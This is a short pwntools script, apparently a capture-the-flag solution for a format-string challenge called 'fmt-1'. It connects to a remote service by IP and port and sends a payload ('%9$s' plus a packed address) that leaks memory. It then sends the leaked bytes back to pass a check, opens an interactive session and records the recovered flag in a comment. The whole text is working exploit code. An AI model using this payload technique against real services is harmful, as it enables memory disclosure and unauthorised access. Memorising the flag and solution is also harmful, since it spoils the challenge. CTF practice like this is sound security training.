from pwn import *
from Crypto.Util.number import bytes_to_long
context.log_level = 'DEBUG'

def p64(n):
    return pack(n, 64, 'little')
def u64(b):
    return unpack(b, 64)

#p = process('./fmt-1')

p = remote('140.110.112.211', 4002)
payload = b'%9$sAAAA' + p64(0x00404050)#p64(0x00404050) + b'AAAA'*2 + b'%3$p' # offset = 8
#gdb.attach(p, gdbscript=('b *0x04012dc\nb *0x0401314\n'))
p.recvuntil(b':')
p.sendline(payload)
check_bytes = p.recvuntil(b'AAAA')
p.recvuntil(b':')
p.sendline(check_bytes)
p.interactive()
# FLAG{f0rm47_5tring_told_y0u_the_secr3t}
